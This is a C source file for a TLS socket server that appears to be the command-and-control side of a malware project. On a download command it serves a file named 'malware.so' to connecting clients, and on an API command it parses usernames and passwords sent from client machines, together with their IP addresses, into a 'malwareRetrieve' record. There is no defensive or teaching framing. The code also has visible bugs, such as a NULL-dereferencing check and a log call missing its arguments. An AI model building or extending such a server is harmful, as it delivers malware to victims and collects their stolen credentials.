#include <openssl/crypto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include "server.h"
#include <stdarg.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
// dont forget about too many conn and dos!!


struct sockaddr_in addr;
struct sockaddr_in client_addr;
  
void printLog(char *msg, ...){
  printf("\33[2K\r");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  fflush(stdout);
  va_end(args);
  printf("Interact -> ");
  fflush(stdout);  
  
}


void *handleClient(void *arg) {
  infoclient *client = (infoclient*)arg;
  if (!client) {
      fprintf(stderr, "[ERR] client == NULL in handleClient()\n");
      return NULL;
  }

  printLog("[LOG][id: %d - from: %s] Connexion established and is being handled!\n",
           client->client, client->ip);
  
  while (1) {
      char buffer[512];
      memset(buffer, 0, sizeof(buffer));
      int len = SSL_read(client->ssl, buffer, sizeof(buffer));
      if (len <= 0) {
          printLog("[LOG][id: %d - from: %s] closed or SSL_read failed\n",
                   client->client, client->ip);
          goto cleanup;
      }

      buffer[len] = '\0';
      buffer[strcspn(buffer, "\r\n")] = '\0'; 

      printLog("[LOG][id: %d - from: %s] Message received: %s\n",
               client->client, client->ip, buffer);

      char *saveTOK;
      char *clientinput = strtok_r(buffer, " ", &saveTOK);

      if (clientinput && strncmp(clientinput, DOWNLOAD_COMMAND, strlen(DOWNLOAD_COMMAND)) == 0) {
        if (strtok_r(NULL, " ", &saveTOK) != NULL ) {
          printLog("[ERR][id: %d - from: %s] Too many arguments\n", client->client, client->ip);
          goto cleanup;
        }
        
        FILE *file = fopen("malware.so", "rb");
        if (!file) {
          printLog("[ERR] Failed to open the malware.so file!\n");
          SSL_write(client->ssl, "failed\n", 7 );
          goto cleanup;
        }

        char fileBuffer[CHUNK_SIZE];
        size_t bytesRead;

        while ((bytesRead = fread(fileBuffer, 1, sizeof(fileBuffer), file)) > 0) {
          if (SSL_write(client->ssl, fileBuffer, bytesRead) <= 0) {
            printLog("[ERR] Failed to send filebuffer to target \n");
            break;
          }
        }

        printLog("[LOG][id: %d - from: %s] File send succesfully\n");
        fclose(file);
        goto cleanup;

      }


      if (!clientinput && strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) != 0) {
          printLog("[LOG][id: %d - from: %s] Invalid or missing command\n",
                   client->client, client->ip);
          continue;
      }

      malwareRetrieve current = {0};
      clientinput = strtok_r(NULL, " ", &saveTOK);
      if (!clientinput) {
          printLog("[LOG][id: %d - from: %s] Missing username argument\n",
                   client->client, client->ip);
          continue;
      }
      strncpy(current.username, clientinput, sizeof(current.username) - 1);

      clientinput = strtok_r(NULL, " ", &saveTOK);
      if (!clientinput) {
          printLog("[LOG][id: %d - from: %s] Missing password argument\n",
                   client->client, client->ip);
          continue;
      }
      if (strtok_r(NULL, " ", &saveTOK)) {
          printLog("[LOG][id: %d - from: %s] Too many arguments\n",
                   client->client, client->ip);
          continue;
      }

      strncpy(current.password, clientinput, sizeof(current.password) - 1);
      strncpy(current.ipaddr, client->ip, sizeof(current.ipaddr) - 1);

      continue;
  }

cleanup:
    printLog("[LOG][id: %d - from: %s] Closing connexion\n", client->client, client->ip);
    if (client->ssl) {
        SSL_shutdown(client->ssl);
        SSL_free(client->ssl);
    }
    if (client->client >= 0)
        close(client->client);
    free(client);

    return NULL;
}

void *ListenToClient(void *arg){
  context *fullcontext = (context*) arg;
  printLog("[LOG] Socket binded and listening !\n[LOG] Waiting for new connexion...\n");
  while (1) {
    // Accept new client connexion
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int newsocket = accept(fullcontext->fd, (struct sockaddr *) &client_addr, &client_len);
    if (newsocket == -1) {
      printLog("[ERR] Error in accept for new client\n");
      exit(1);
    }
    
    infoclient *client  = malloc(sizeof(infoclient));
    if (client == NULL) {
      printLog("[ERR] Failed to malloc the infoclient\n");
      exit(1);
    }
    client->client = newsocket;
    client->ssl = SSL_new(fullcontext->ctx);
    if (!client->ssl) {
      printLog("[ERR] SSL_new failed\n");
      exit(1);
    }
    
    if (SSL_set_fd(client->ssl, client->client) != 1){
      printLog("[LOG] SSL_set_fd failed\n");
      exit(-1);
    }

    int ret = SSL_accept(client->ssl);
    if (ret <= 0) {
        printLog("[ERR] SSL_accept failed\n");
        close(client->client);
        SSL_free(client->ssl);
        free(client);
        continue;
    }

    inet_ntop(AF_INET, &client_addr.sin_addr, client->ip , sizeof(client->ip));
    pthread_t newthread;
    if (pthread_create(&newthread, NULL, handleClient, client) != 0){
      printLog("[ERR] Thread create failed for handle cient \n");
      exit(-1);
    }
    pthread_detach(newthread);
  }
  
}




int main(){
  printLog("[STARTING] Starting the server program\n");

// Setup SSL AND SOCKET FOR THE SERVER
  SSL_load_error_strings();
  OpenSSL_add_ssl_algorithms();

// Setup context for ssl  
  const SSL_METHOD *method = TLS_server_method();
  SSL_CTX *ctx = SSL_CTX_new(method);
  if (!ctx) {
    printLog("[ERR] Error setting context for ssl\n");
    exit(-1);
  }

  if (!SSL_CTX_use_certificate_file(ctx, "certificate.crt", SSL_FILETYPE_PEM)){
    printLog("[ERR] Error in setting certificate file\n");
    exit(-1);
  }
  if (!SSL_CTX_use_PrivateKey_file(ctx, "private.key", SSL_FILETYPE_PEM)){
    printLog("[ERR] Error in setting private key file\n");
    exit(-1);
  }

  if (!SSL_CTX_check_private_key(ctx)) {
      printLog("[ERR] Private key does not match cert\n");
      exit(1);
  }

// Create socket
  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
  if (socketfd == -1) {
    printLog("[ERR] Failed to initialise a socket ");
  }

  addr.sin_family = AF_INET;
  addr.sin_port = htons(6000); 
  addr.sin_addr.s_addr = INADDR_ANY;

// Bind socket
  if (bind(socketfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1){
    printLog("[ERR] Error code -1 -  in binding the port \n");
    exit(-1);
  }
  int opt = 1;
  setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

// Make the socket listen
  if (listen(socketfd, 10) == -1) {
    printLog("[ERR] Error code -1 - Failed to set the socket to listen \n");
    exit(-1);
  }
  context *fullcontext = malloc(sizeof(context));
  if (fullcontext == NULL) {
    printLog("[ERR] Error in malloc for fullcontext struct \n");
    exit(1);
  }
  fullcontext->fd = socketfd;
  fullcontext->ctx = ctx;
  
  pthread_t mainLoop;
  if (pthread_create(&mainLoop, NULL, ListenToClient, fullcontext) != 0) {
    printLog("[ERR] Error thread create main loop \n");
    exit(-1);
  }
    
  printf("Interact -> ");
  while (1) {
    char buffer[64];
    fgets(buffer, sizeof(buffer), stdin);
  }

}
